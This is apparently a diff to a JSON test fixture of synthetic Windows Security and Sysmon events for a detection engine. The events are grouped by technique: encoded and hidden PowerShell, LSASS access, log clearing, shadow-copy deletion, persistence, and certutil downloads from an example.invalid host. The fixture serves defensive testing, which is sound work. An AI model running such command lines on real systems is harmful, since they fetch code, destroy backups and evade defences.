-    {"source": "security", "host": "WIN-SYNTHETIC", "event_id": 4688, "record_id": 902, "timestamp": "2026-01-15T10:00:00Z", "fields": {"NewProcessName": "C:/Example/pwsh.exe", "CommandLine": "pwsh.exe -enc \"BBBB==\""}},
-    {"source": "security", "host": "WIN-SYNTHETIC", "event_id": 4688, "record_id": 903, "timestamp": "2026-01-15T10:00:00Z", "fields": {"NewProcessName": "C:/Example/powershell.exe", "CommandLine": "powershell.exe -NoProfile -ENC CCCC"}}
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 901,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "powershell.exe -EncodedCommand AAAA"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 902,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/pwsh.exe",
+        "CommandLine": "pwsh.exe -enc \"BBBB==\""
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 903,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -ENC CCCC"
+      }
+    }
+  ],
+  "remote-thread-observed": [
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 8,
+      "record_id": 4001,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture0.exe",
+        "TargetImage": "C:\\Example\\target.exe",
+        "GrantedAccess": "0x1010"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 8,
+      "record_id": 4002,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture1.exe",
+        "TargetImage": "C:\\Example\\target.exe",
+        "GrantedAccess": "0x1010"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 8,
+      "record_id": 4003,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture2.exe",
+        "TargetImage": "C:\\Example\\target.exe",
+        "GrantedAccess": "0x1010"
+      }
+    }
+  ],
+  "lsass-process-access": [
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 10,
+      "record_id": 4007,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture0.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1010"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 10,
+      "record_id": 4008,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture1.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1010"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 10,
+      "record_id": 4009,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "SourceImage": "C:\\Example\\fixture2.exe",
+        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+        "GrantedAccess": "0x1010"
+      }
+    }
+  ],
+  "security-log-cleared": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 1102,
+      "record_id": 4013,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {}
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 1102,
+      "record_id": 4014,
+      "timestamp": "2026-01-15T10:00:01+00:00",
+      "fields": {}
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 1102,
+      "record_id": 4015,
+      "timestamp": "2026-01-15T10:00:02+00:00",
+      "fields": {}
+    }
+  ],
+  "system-log-cleared": [
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 104,
+      "record_id": 4019,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "Provider": "Microsoft-Windows-Eventlog"
+      }
+    },
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 104,
+      "record_id": 4020,
+      "timestamp": "2026-01-15T10:00:01+00:00",
+      "fields": {
+        "Provider": "Microsoft-Windows-Eventlog"
+      }
+    },
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 104,
+      "record_id": 4021,
+      "timestamp": "2026-01-15T10:00:02+00:00",
+      "fields": {
+        "Provider": "Microsoft-Windows-Eventlog"
+      }
+    }
+  ],
+  "local-user-created": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4720,
+      "record_id": 4025,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "TargetDomainName": "WIN-SYNTHETIC",
+        "TargetUserName": "fixture0"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4720,
+      "record_id": 4026,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "TargetDomainName": "WIN-SYNTHETIC",
+        "TargetUserName": "fixture1"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4720,
+      "record_id": 4027,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "TargetDomainName": "WIN-SYNTHETIC",
+        "TargetUserName": "fixture2"
+      }
+    }
+  ],
+  "local-admin-member-added": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4732,
+      "record_id": 4031,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "TargetSid": "S-1-5-32-544"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4732,
+      "record_id": 4032,
+      "timestamp": "2026-01-15T10:00:01+00:00",
+      "fields": {
+        "TargetSid": "S-1-5-32-544"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4732,
+      "record_id": 4033,
+      "timestamp": "2026-01-15T10:00:02+00:00",
+      "fields": {
+        "TargetSid": "S-1-5-32-544"
+      }
+    }
+  ],
+  "office-shell-start": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4037,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/cmd.exe",
+        "CommandLine": "",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4038,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "",
+        "ParentProcessName": "C:/Example/excel.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4039,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/pwsh.exe",
+        "CommandLine": "",
+        "ParentProcessName": "C:/Example/outlook.exe"
+      }
+    }
+  ],
+  "shadow-copy-deletion-request": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4043,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/vssadmin.exe",
+        "CommandLine": "fixture delete shadows",
+        "ParentProcessName": ""
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4044,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/wmic.exe",
+        "CommandLine": "fixture shadowcopy delete",
+        "ParentProcessName": ""
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 4045,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "NewProcessName": "C:/Example/vssadmin.exe",
+        "CommandLine": "fixture DELETE SHADOWS",
+        "ParentProcessName": ""
+      }
+    }
+  ],
+  "discovery-utility-burst": [
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-0",
+      "event_id": 1,
+      "record_id": 4049,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "Image": "C:/Example/systeminfo.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-0",
+      "event_id": 1,
+      "record_id": 4050,
+      "timestamp": "2026-01-15T10:00:15+00:00",
+      "fields": {
+        "Image": "C:/Example/whoami.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-0",
+      "event_id": 1,
+      "record_id": 4051,
+      "timestamp": "2026-01-15T10:01:00+00:00",
+      "fields": {
+        "Image": "C:/Example/ipconfig.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-1",
+      "event_id": 1,
+      "record_id": 4052,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "Image": "C:/Example/whoami.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-1",
+      "event_id": 1,
+      "record_id": 4053,
+      "timestamp": "2026-01-15T10:00:15+00:00",
+      "fields": {
+        "Image": "C:/Example/ipconfig.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-1",
+      "event_id": 1,
+      "record_id": 4054,
+      "timestamp": "2026-01-15T10:01:00+00:00",
+      "fields": {
+        "Image": "C:/Example/netstat.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-2",
+      "event_id": 1,
+      "record_id": 4055,
+      "timestamp": "2026-01-15T10:00:00+00:00",
+      "fields": {
+        "Image": "C:/Example/ipconfig.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-2",
+      "event_id": 1,
+      "record_id": 4056,
+      "timestamp": "2026-01-15T10:00:15+00:00",
+      "fields": {
+        "Image": "C:/Example/netstat.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-FIXTURE-2",
+      "event_id": 1,
+      "record_id": 4057,
+      "timestamp": "2026-01-15T10:01:00+00:00",
+      "fields": {
+        "Image": "C:/Example/nbtstat.exe",
+        "ParentProcessGuid": "fixture-parent"
+      }
+    }
+  ],
+  "powershell-hidden-window": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 5000,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "powershell.exe -WindowStyle Hidden"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 5001,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "powershell.exe -w \"hidden\""
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 5002,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -WINDOWSTYLE HIDDEN"
+      }
+    }
+  ],
+  "windows-service-installed": [
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 7045,
+      "record_id": 7000,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "ServiceName": "Fixture Updater"
+      }
+    },
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 7045,
+      "record_id": 7001,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "ServiceName": "Fixture Device Service"
+      }
+    },
+    {
+      "source": "system",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 7045,
+      "record_id": 7002,
+      "timestamp": "2026-01-15T10:00:00Z",
+      "fields": {
+        "ServiceName": "Fixture Inventory Agent"
+      }
+    }
+  ],
+  "scheduled-task-created": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4698,
+      "record_id": 7010,
+      "timestamp": "2026-01-15T10:00:01Z",
+      "fields": {
+        "TaskName": "Fixture Update"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4698,
+      "record_id": 7011,
+      "timestamp": "2026-01-15T10:00:01Z",
+      "fields": {
+        "TaskName": "Fixture Inventory"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4698,
+      "record_id": 7012,
+      "timestamp": "2026-01-15T10:00:01Z",
+      "fields": {
+        "TaskName": "Fixture Maintenance"
+      }
+    }
+  ],
+  "registry-run-value-set": [
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 13,
+      "record_id": 7020,
+      "timestamp": "2026-01-15T10:00:04Z",
+      "fields": {
+        "TargetObject": "HKLM\\Software\\Example\\CurrentVersion\\Run\\Fixture"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 13,
+      "record_id": 7021,
+      "timestamp": "2026-01-15T10:00:04Z",
+      "fields": {
+        "TargetObject": "HKLM\\Software\\Example\\CurrentVersion\\RunOnce\\Fixture"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 13,
+      "record_id": 7022,
+      "timestamp": "2026-01-15T10:00:04Z",
+      "fields": {
+        "TargetObject": "HKLM\\Software\\Example\\CurrentVersion\\Run\\Updater"
+      }
+    }
+  ],
+  "certificate-url-cache": [
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 8000,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/certutil.exe",
+        "CommandLine": "certutil.exe -urlcache https://example.invalid/a"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 8001,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/certutil.exe",
+        "CommandLine": "certutil.exe -urlcache http://example.invalid/b"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 8002,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:/Example/certutil.exe",
+        "CommandLine": "certutil.exe -URLCACHE https://example.invalid/c"
+      }
+    }
   ]
 }
